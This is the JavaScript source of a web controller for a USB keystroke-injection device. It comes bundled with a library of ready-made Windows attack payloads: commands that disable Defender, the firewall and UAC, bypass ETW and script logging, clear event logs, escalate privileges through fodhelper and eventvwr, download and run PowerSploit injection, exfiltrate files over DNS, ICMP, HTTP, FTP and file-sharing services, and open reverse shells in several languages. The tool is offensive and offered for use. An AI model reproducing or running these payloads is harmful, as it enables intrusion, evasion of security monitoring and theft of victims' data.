'use strict';

const DUCK_CFG = {
    CHUNK_SIZE: 95,
    ACK_TIMEOUT: 10000,
    SAFE_MODE: true,
    MAX_CONVERTER_ITERATIONS: 10000,
};

const Base64 = {
    encode(str) {
        try {
            return btoa(unescape(encodeURIComponent(str)));
        } catch (e) {
            throw new Error("Base64 encode failed");
        }
    },
    decode(str) {
        try {
            return decodeURIComponent(escape(atob(str)));
        } catch (e) {
            throw new Error("Base64 decode failed");
        }
    }
};

const Payloads = {

    windows: {
        
        evasion: {

            etwBypass() {
                return `powershell -c "[Reflection.Assembly]::LoadWithPartialName('System.Core');$a=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');$b=$a.GetField('etwProvider','NonPublic,Static');$c=$b.GetValue($null);[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($c,0)"`;
            },

            disableScriptBlockLogging() {
                return `powershell -c "$s=[Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static');$s.SetValue($null,@{'ScriptBlockLogging'=@{'EnableScriptBlockLogging'=0}})"`;
            },

            clearPSHistory() {
                return `powershell -c "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue; Clear-History; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()"`;
            },

            disableDefenderAdvanced() {
                return `powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true -SubmitSamplesConsent 2 -MAPSReporting 0 -HighThreatDefaultAction 6 -ModerateThreatDefaultAction 6 -LowThreatDefaultAction 6 -SevereThreatDefaultAction 6"`;
            },

            disableTamperProtection() {
                return `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v TamperProtection /t REG_DWORD /d 0 /f`;
            },

            processHollowing(target_process = "svchost.exe") {
                return `powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1'); Invoke-ReflectivePEInjection -PEPath malware.exe -ProcessName ${target_process}"`;
            },

            reflectiveDLL(dll_url) {
                return `powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1'); Invoke-ReflectivePEInjection -PEUrl ${dll_url} -ForceASLR"`;
            },

            ppidSpoof(parent_process, command) {
                return `powershell -c "$parentId = (Get-Process ${parent_process})[0].Id; $si = New-Object System.Diagnostics.ProcessStartInfo; $si.FileName = 'cmd.exe'; $si.Arguments = '/c ${command}'; $si.UseShellExecute = $false; $p = New-Object System.Diagnostics.Process; $p.StartInfo = $si; $p.Start()"`;
            },

            disableFirewall() {
                return `netsh advfirewall set allprofiles state off`;
            },
            
            disableUAC() {
                return `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f`;
            },
            
            clearEventLogs() {
                return `powershell -c "wevtutil cl System; wevtutil cl Security; wevtutil cl Application"`;
            },
            
            excludePath(path) {
                return `powershell -c "Add-MpPreference -ExclusionPath '${path}'"`;
            }
        },

        privesc: {
            fodhelperBypass(command) {
                return `powershell -c "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force; New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force; Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value '${command}' -Force; Start-Process 'C:\\Windows\\System32\\fodhelper.exe' -WindowStyle Hidden; Start-Sleep 3; Remove-Item 'HKCU:\\Software\\Classes\\ms-settings\\' -Recurse -Force"`;
            },

            eventvwrBypass(command) {
                return `powershell -c "New-Item 'HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command' -Force; Set-ItemProperty 'HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command' -Name '(default)' -Value '${command}' -Force; Start-Process 'eventvwr.exe'; Start-Sleep 3; Remove-Item 'HKCU:\\Software\\Classes\\mscfile' -Recurse -Force"`;
            },

            computerDefaultsBypass(command) {
                return `powershell -c "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force; New-ItemProperty 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -PropertyType String -Force; Set-ItemProperty 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value '${command}' -Force; Start-Process 'C:\\Windows\\System32\\ComputerDefaults.exe'; Start-Sleep 2; Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force"`;
            },

            tokenImpersonation() {
                return `powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1'); Get-System"`;
            },

            alwaysInstallElevated(msi_path) {
                return `reg add HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f && reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f && msiexec /quiet /qn /i ${msi_path}`;
            },

            dllHijackScan() {
                return `powershell -c "Get-Process | ForEach-Object { try { $_.Modules | Where-Object { -not (Test-Path $_.FileName) } | Select-Object @{Name='Process';Expression={$_.ModuleName}}, FileName } catch {} }"`;
            }
        },

        exfiltration: {

            dnsExfil(file_path, domain) {
                return `powershell -c "$content = [Convert]::ToBase64String([IO.File]::ReadAllBytes('${file_path}')); $chunks = [regex]::Matches($content, '.{1,63}'); $i=0; foreach($chunk in $chunks) { nslookup $i.$($chunk.Value).${domain}; $i++ }"`;
            },

            icmpExfil(target_ip, file_path) {
                return `powershell -c "$bytes = [IO.File]::ReadAllBytes('${file_path}'); $ping = New-Object System.Net.NetworkInformation.Ping; foreach($b in $bytes) { $ping.Send('${target_ip}', 1000, @($b)) | Out-Null; Start-Sleep -Milliseconds 50 }"`;
            },

            httpExfilFile(url, file_path, field_name = "file") {
                return `powershell -c "$filePath = '${file_path}'; $url = '${url}'; $fileBytes = [IO.File]::ReadAllBytes($filePath); $fileName = [IO.Path]::GetFileName($filePath); $boundary = [Guid]::NewGuid().ToString(); $headers = @{'Content-Type' = 'multipart/form-data; boundary=' + $boundary}; $bodyLines = @(); $bodyLines += '--' + $boundary; $bodyLines += 'Content-Disposition: form-data; name=\\"${field_name}\\"; filename=\\"' + $fileName + '\\"'; $bodyLines += 'Content-Type: application/octet-stream'; $bodyLines += ''; $body = [System.Text.Encoding]::UTF8.GetBytes(($bodyLines -join \\"\\r\\n\\") + \\"\\r\\n\\"); $body += $fileBytes; $body += [System.Text.Encoding]::UTF8.GetBytes(\\"\\r\\n--\\" + $boundary + \\"--\\r\\n\\"); Invoke-RestMethod -Uri $url -Method POST -Headers $headers -Body $body"`;
            },

            httpExfilBase64(url, file_path) {
                return `powershell -c "$content = [Convert]::ToBase64String([IO.File]::ReadAllBytes('${file_path}')); $fileName = [IO.Path]::GetFileName('${file_path}'); $body = @{filename=$fileName; data=$content} | ConvertTo-Json; Invoke-RestMethod -Uri '${url}' -Method POST -Body $body -ContentType 'application/json'"`;
            },

            emailExfil(smtp, from, to, subject, file_path, body = "Data attached") {
                return `powershell -c "Send-MailMessage -SmtpServer '${smtp}' -From '${from}' -To '${to}' -Subject '${subject}' -Body '${body}' -Attachments '${file_path}'"`;
            },

            ftpExfil(server, user, pass, file_path, remote_path = null) {
                const remotePath = remote_path || "[IO.Path]::GetFileName('${file_path}')";
                return `powershell -c "$webclient = New-Object System.Net.WebClient; $webclient.Credentials = New-Object System.Net.NetworkCredential('${user}','${pass}'); $webclient.UploadFile('ftp://${server}/${remotePath}', '${file_path}')"`;
            },

            ftpExfilPassive(server, user, pass, file_path, remote_filename = null) {
                const remoteName = remote_filename || "[IO.Path]::GetFileName('${file_path}')";
                return `powershell -c "$ftpRequest = [System.Net.FtpWebRequest]::Create('ftp://${server}/' + ${remoteName}); $ftpRequest.Credentials = New-Object System.Net.NetworkCredential('${user}','${pass}'); $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile; $ftpRequest.UseBinary = $true; $ftpRequest.UsePassive = $true; $fileContent = [IO.File]::ReadAllBytes('${file_path}'); $ftpRequest.ContentLength = $fileContent.Length; $requestStream = $ftpRequest.GetRequestStream(); $requestStream.Write($fileContent, 0, $fileContent.Length); $requestStream.Close(); $response = $ftpRequest.GetResponse(); $response.Close()"`;
            },

            webdavExfil(url, user, pass, file_path) {
                return `powershell -c "$fileName = [IO.Path]::GetFileName('${file_path}'); $uri = '${url}/' + $fileName; $content = [IO.File]::ReadAllBytes('${file_path}'); $secpass = ConvertTo-SecureString '${pass}' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('${user}', $secpass); Invoke-RestMethod -Uri $uri -Method PUT -Body $content -Credential $cred"`;
            },

            transfershExfil(file_path, max_downloads = 1) {
                return `powershell -c "$fileName = [IO.Path]::GetFileName('${file_path}'); $content = [IO.File]::ReadAllBytes('${file_path}'); $response = Invoke-RestMethod -Uri \\"https://transfer.sh/$fileName?max-downloads=${max_downloads}\\" -Method PUT -Body $content; Write-Host \\"Download URL: $response\\""`;
            },

            fileioExfil(file_path) {
                return `powershell -c "$fileName = [IO.Path]::GetFileName('${file_path}'); $fileBytes = [IO.File]::ReadAllBytes('${file_path}'); $boundary = [Guid]::NewGuid().ToString(); $headers = @{'Content-Type' = 'multipart/form-data; boundary=' + $boundary}; $bodyLines = @('--' + $boundary, 'Content-Disposition: form-data; name=\\"file\\"; filename=\\"' + $fileName + '\\"', 'Content-Type: application/octet-stream', ''); $body = [Text.Encoding]::UTF8.GetBytes(($bodyLines -join \\"\\r\\n\\") + \\"\\r\\n\\"); $body += $fileBytes; $body += [Text.Encoding]::UTF8.GetBytes(\\"\\r\\n--\\" + $boundary + \\"--\\r\\n\\"); $response = Invoke-RestMethod -Uri 'https://file.io' -Method POST -Headers $headers -Body $body; Write-Host \\"Download URL: $($response.link)\\""`;
            },

        },

        reverseShells: {
            powershell(ip, port) {
                return `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
            },

            python(ip, port) {
                return `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`;
            },

            bash(ip, port) {
                return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
            },

            netcat(ip, port) {
                return `nc -e /bin/sh ${ip} ${port}`;
            },

            perl(ip, port) {
                return `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
            }
        }
    },

    powershell(cmd) {
        const encoded = Base64.encode(cmd.split('').map(c => c + '\0').join(''));
        return `powershell -NoP -NonI -W Hidden -Enc ${encoded}`;
    },

    downloadExec(url, filename = "payload.exe") {
        return `powershell -c "IWR -Uri '${url}' -OutFile '$env:TEMP\\${filename}'; Start-Process '$env:TEMP\\${filename}'"`;
    },
    
};

const Strings = {

    rot13 (str) {
        return str.replace(/[a-zA-Z]/g, c => 
            String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)
        );
    },
    
    hexEncode(str) {
        return Array.from(str).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
    },

    hexDecode(hex) {
        return hex.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    },

    reverseString(str) {
        return str.split('').reverse().join('');
    },

    caesarCipher(str, shift = 3) {
        return str.replace(/[a-z]/gi, c => {
            const start = c <= 'Z' ? 65 : 97;
            return String.fromCharCode(start + (c.charCodeAt(0) - start + shift) % 26);
        });
    },

    urlEncode(str) {
        return encodeURIComponent(str);
    },

    obfuscate(str, key = 42) {
        return str.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ key)).join('');
    },
    
    deobfuscate(str, key = 42) {
        return this.obfuscate(str, key);
    },
    
    random(length = 10) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }
};

class DuckComm {
    constructor() {
        this.ackListener = null; 
        this.ackQueue = [];
    }

    isConnected() {
        try {
            if (typeof WSManager !== 'undefined' && WSManager.ws && WSManager.ws.readyState === 1) return true;
            if (window.ws && window.ws.readyState === 1) return true;
            return false;
        } catch (e) {
            return false;
        }
    }

    _initACKListener() {
        if (this.ackListener) return;

        this.ackListener = (e) => {
            if (this.ackQueue.length > 0) {
                const pending = this.ackQueue.shift();
                clearTimeout(pending.timer);

                if (e.detail === "OK") {
                    pending.resolve();
                } else {
                    pending.reject(new Error("DEVICE_ERROR: " + e.detail));
                }
            }
        };

        window.addEventListener("key_ack", this.ackListener);
    }

    waitACK(timeout = DUCK_CFG.ACK_TIMEOUT) {
        this._initACKListener();

        return new Promise((resolve, reject) => {
            const timer = setTimeout(() => {
                const index = this.ackQueue.findIndex(p => p.timer === timer);
                if (index !== -1) {
                    this.ackQueue.splice(index, 1);
                }
                reject(new Error(`TIMEOUT despues de ${timeout}ms`));
            }, timeout);

            this.ackQueue.push({ resolve, reject, timer });
        });
    }

    async send(cmd) {
        if (!this.isConnected()) {
            throw new Error("WebSocket not connected");
        }

        const ackPromise = this.waitACK();

        if (typeof ws_send === 'function') {
            ws_send(`key_ack ${cmd}\n`, () => {}, false);
        } else {
            throw new Error("ws_send not available");
        }

        await ackPromise;
    }

    async sendString(text) {
        if (!text) return;

        for (let i = 0; i < text.length; i += DUCK_CFG.CHUNK_SIZE) {
            const chunk = text.substring(i, i + DUCK_CFG.CHUNK_SIZE);
            
            await this.send(`STRING ${chunk}`);
        }
    }

    async sendText(text, addFinalEnter = false) {
        if (!text) return;

        const lines = text.split('\n');

        for (let i = 0; i < lines.length; i++) {
            const line = lines[i];
            const isLastLine = i === lines.length - 1;

            if (line.length > 0) {
                await this.sendString(line);
            }

            if (!isLastLine || addFinalEnter) {
                await this.send('ENTER');
            }
        }
    }

    cleanup() {
        if (this.ackListener) {
            window.removeEventListener("key_ack", this.ackListener);
            this.ackListener = null;
        }

        while (this.ackQueue.length > 0) {
            const pending = this.ackQueue.shift();
            clearTimeout(pending.timer);
            pending.reject(new Error("Cleanup"));
        }

        console.log("ACK listener cleaned up");
    }
}

class DuckExecutor {
    constructor() {
        this.comm = new DuckComm();
        this.running = false;
        this.queue = Promise.resolve();
        this.commandCount = 0;
        this.hasError = false;
    }

    start() { 
        this.running = true;
        this.commandCount = 0;
        this.hasError = false;
    }

    stop() { 
        console.log("Stopping executor...");
        this.running = false;
        this.hasError = true;
        this.comm.cleanup();
    }

    _executeHybrid(taskFn) {
        this.queue = this.queue.then(async () => {
            if (!this.running) {
                throw new Error("Execution stopped");
            }

            if (this.hasError) {
                throw new Error("Previous command failed");
            }

            this.commandCount++;

            try {
                await taskFn();
                await new Promise(r => setTimeout(r, 10));
            } catch (err) {
                this.hasError = true;
                this.running = false;
                console.error("Command failed:", err.message);
                throw err;
            }
        });

        return this.queue;
    }

    async waitComplete() { 
        await this.queue; 
    }

    type(text) {
        return this._executeHybrid(async () => {
            await this.comm.sendText(text, false);
        });     
    }

    typeln(text) {
        return this._executeHybrid(async () => {
            await this.comm.sendText(text, true);
        });
    }

    press(...keys) {
        return this._executeHybrid(async () => {
            await this.comm.send(keys.join(' '));
        });
    }

    delay(ms) {
        return this._executeHybrid(async () => {
            await new Promise(resolve => setTimeout(resolve, ms));
        });
    }

    led(led, active) {
        return this._executeHybrid(async () => {
            await this.comm.send(`LED ${led} ${active ? 1 : 0}`);
        });
    }

    locale(layout) {
        return this._executeHybrid(async () => {
            await this.comm.send(`LOCALE ${layout}`);
        });
    }

    comment(text) {
        return this._executeHybrid(async () => {
            console.log(`COMMENT: ${text}`);
        });
    }

    move(x, y) {
        return this._executeHybrid(async () => {
            await this.comm.send(`M_MOVE ${x} ${y}`);
        });
    }

    click(btn = 1) {
        return this._executeHybrid(async () => {
            await this.comm.send(`M_CLICK ${btn}`);
        });
    }

    scroll(amt) {
        return this._executeHybrid(async () => {
            await this.comm.send(`M_SCROLL ${amt}`);
        });
    }

    press_mouse(btn = 1) {
        return this._executeHybrid(async () => {
            await this.comm.send(`M_PRESS ${btn}`);
        });
    }

    release_mouse(btn = 1) {
        return this._executeHybrid(async () => {
            await this.comm.send(`M_RELEASE ${btn}`);
        });
    }

    keycode(...keycodes) {
         return this._executeHybrid(async () => {
            await this.comm.send(`KEYCODE ${keycodes.join(' ')}`, true);
        });
    }

    enter() { return this.press('ENTER'); }
    tab() { return this.press('TAB'); }
    esc() { return this.press('ESC'); }
    combo(...keys) { return this.press(...keys); }
}

class DuckyScriptConverter {
    constructor() {
        this.output = [];
        this.commandCount = 0;
    }

    _checkLimit() {
        this.commandCount++;
        if (this.commandCount > DUCK_CFG.MAX_CONVERTER_ITERATIONS) {
            throw new Error("Infinite loop detected!");
        }
    }

    type(text) {
        this._checkLimit();
        const lines = text.split('\n');
        lines.forEach((line, i) => {
            if (line) this.output.push(`STRING ${line}`);
            if (i < lines.length - 1) this.output.push('ENTER');
        });
    }

    typeln(text) {
        this._checkLimit();
        const lines = text.split('\n');
        lines.forEach((line) => {
            if (line) {
                this.output.push(`STRING ${line}`);
                this.output.push('ENTER');
            }
        });
    }

    press(...keys) {
        this._checkLimit();
        this.output.push(keys.join(' '));
    }

    delay(ms) {
        this._checkLimit();
        this.output.push(`DELAY ${ms}`);
    }

    led(led, active) {
        this._checkLimit();
        this.output.push(`LED ${led} ${active ? 1 : 0}`);
    }

    locale(layout) {
        this._checkLimit();
        this.output.push(`LOCALE ${layout}`);
    }

    comment(text) {
        this.output.push(`REM ${text}`);
    }

    move(x, y) {
        this._checkLimit();
        this.output.push(`M_MOVE ${x} ${y}`);
    }

    click(btn = 1) {
        this._checkLimit();
        this.output.push(`M_CLICK ${btn}`);
    }

    scroll(amt) {
        this._checkLimit();
        this.output.push(`M_SCROLL ${amt}`);
    }

    press_mouse(btn = 1) {
        this._checkLimit();
        this.output.push(`M_PRESS ${btn}`);
    }

    release_mouse(btn = 1) {
        this._checkLimit();
        this.output.push(`M_RELEASE ${btn}`);
    }

    keycode(...keycodes) {
        this._checkLimit();
        this.output.push(`KEYCODE ${keycodes.join(' ')}`);
    }

    enter() { this.press('ENTER'); }
    tab() { this.press('TAB'); }
    esc() { this.press('ESC'); }
    combo(...keys) { this.press(...keys); }

    repeat(count, fn) {
        this.comment(`REPEAT ${count} times`);
        for (let i = 0; i < count; i++) fn(i);
        this.comment(`END REPEAT`);
    }

    getDuckyScript() {
        return this.output.join('\n');
    }
}

class SafeUtils {
    constructor(executor) {
        this.executor = executor;
    }

    random(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    log(...args) {
        console.log('[SCRIPT]', ...args);
    }

    timestamp() {
        return Date.now();
    }

    isRunning() {
        return this.executor.running && !this.executor.hasError;
    }

    async sleep(ms) {
        await new Promise(r => setTimeout(r, ms));
    }
}

const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;

function buildAPI(executor, utils, isConverter = false) {
    const api = {
        comment: (txt) => executor.comment(txt),
        typeln: (txt) => executor.typeln(txt),
        type: (txt) => executor.type(txt),
        press: (...keys) => executor.press(...keys),
        delay: (ms) => executor.delay(ms),
        led: (led, active) => executor.led(led, active),
        locale: (loc) => executor.locale(loc),
        move: (x, y) => executor.move(x, y),
        click: (btn) => executor.click(btn),
        scroll: (amt) => executor.scroll(amt),
        press_mouse: (btn) => executor.press_mouse(btn),
        release_mouse: (btn) => executor.release_mouse(btn),
        keycode: (...keycodes) => executor.keycode(...keycodes),
        enter: () => executor.enter(),
        tab: () => executor.tab(),
        esc: () => executor.esc(),
        combo: (...keys) => executor.combo(...keys),
        
        random: (min, max) => utils.random(min, max),
        log: (...args) => utils.log(...args),
        timestamp: () => utils.timestamp(),
        isRunning: () => utils.isRunning(),
        sleep: (ms) => utils.sleep(ms),
        
        Base64: Base64,
        Payloads: Payloads,
        Strings: Strings,
        
        Math: Math,
        Date: Date,
        JSON: JSON,
        parseInt: parseInt,
        parseFloat: parseFloat,
        String: String,
        Number: Number,
        Boolean: Boolean,
        Array: Array,
        Object: Object,
        Promise: Promise,
        console: { log: utils.log },
        
        ...(isConverter ? {
            repeat: (count, fn) => executor.repeat(count, fn),
        } : {}),
        
        ...(DUCK_CFG.SAFE_MODE ? {
            document: new Proxy({}, { get() { throw new Error("❌ 'document' bloqueado"); } }),
            window: new Proxy({}, { get() { throw new Error("❌ 'window' bloqueado"); } }),
        } : {}),
    };
    
    return api;
}

async function runInterpreter() {
    const editor = document.getElementById('editorJS');
    const runBtn = document.getElementById('runBtnJS');

    if (!editor || !editor.value.trim()) {
        alert("Script empty");
        return;
    }

    const executor = new DuckExecutor();
    if (!executor.comm.isConnected()) return;

    window._duckExecutor = executor;

    if (runBtn) runBtn.disabled = true;

    Status.set("running JS...");

    console.log("═".repeat(60));
    console.log("SCRIPT EXECUTION START");
    console.log("═".repeat(60));

    try {
        executor.start();

        await ws_send("duckparser_reset", () => {}, false);
        await new Promise(r => setTimeout(r, 80));

        const utils = new SafeUtils(executor);
        const api = buildAPI(executor, utils, false);
        const userScript = new AsyncFunction(...Object.keys(api), editor.value);
        
        await userScript(...Object.values(api));
        await executor.waitComplete();

        console.log("═".repeat(60));
        console.log(`COMPLETED (${executor.commandCount} commands)`);
        console.log("═".repeat(60));

        start_status_interval();

    } catch (error) {
        console.log("═".repeat(60));
        console.error("ERROR:", error.message);
        console.log("═".repeat(60));

        start_status_interval();

        if (error.message !== "Execution stopped" && error.message !== "Previous command failed") {
            alert(error.message);
        }

    } finally {
        executor.stop();
        executor.comm.cleanup();
        if (runBtn) runBtn.disabled = false;
        window._duckExecutor = null;
    }
}

function convertToDuckyScript() {
    const editor = document.getElementById('editorJS');
    if (!editor || !editor.value.trim()) {
        alert("Empty");
        return;
    }

    try {
        const converter = new DuckyScriptConverter();
        const utils = new SafeUtils(converter);
        const api = buildAPI(converter, utils, true);
        const userScript = new Function(...Object.keys(api), editor.value);
        userScript(...Object.values(api));

        const output = converter.getDuckyScript();
        const ducky_output = document.getElementById('duckyscriptOutput');

        clearDuckyScriptOutput();

        for (const cmd of output.split("\n")) {
            const div = document.createElement('div');
            div.className = "ducky-cmd";
            div.textContent = cmd;
            div.style.borderBottom = "1px solid #222";
            div.style.fontSize = "11px";
            ducky_output.appendChild(div);
            ducky_output.scrollTop = log.scrollHeight;
        }

    } catch (error) {
        alert(error.message);
    }
}

function clearDuckyScriptOutput() {
    const log = E('duckyscriptOutput');
    if(log) log.innerHTML = '';
}

function copyDuckyScriptOutput() {
    const entries = document.querySelectorAll('.ducky-cmd');
    const text = Array.from(entries).map(e => e.textContent).join('\n');
    
    if (!text) return;
    const textArea = document.createElement("textarea");
    textArea.value = text;
    
    textArea.style.position = "fixed";
    textArea.style.left = "-9999px";
    textArea.style.top = "0";
    document.body.appendChild(textArea);
    
    textArea.focus();
    textArea.select();
    textArea.setSelectionRange(0, textArea.value.length);
    try {
        const successful = document.execCommand('copy');
        if (successful) {
            const log = document.getElementById('duckyscriptOutput');
            if (log) {
                const oldBg = log.style.background;
                log.style.background = "#050"; 
                setTimeout(() => log.style.background = oldBg, 500);
            }
            alert("Copied commands");
        }
    } catch (err) {
        console.error("Copy error:", err);
        alert("Error copying to clipboard");
    }
    document.body.removeChild(textArea);
}

function stopInterpreter() {
    start_status_interval();

    console.log("Stop button pressed");
    
    if (window._duckExecutor) {
        window._duckExecutor.stop();
    }

    const runBtn = document.getElementById('runBtnJS');

    if (runBtn) {
        runBtn.disabled = false;
    }
}

window.addEventListener('load', () => {
    E("runJS").onclick = () => runInterpreter();
    E("stopJS").onclick = () => stopInterpreter();
    E("convertJS").onclick = () => convertToDuckyScript();
});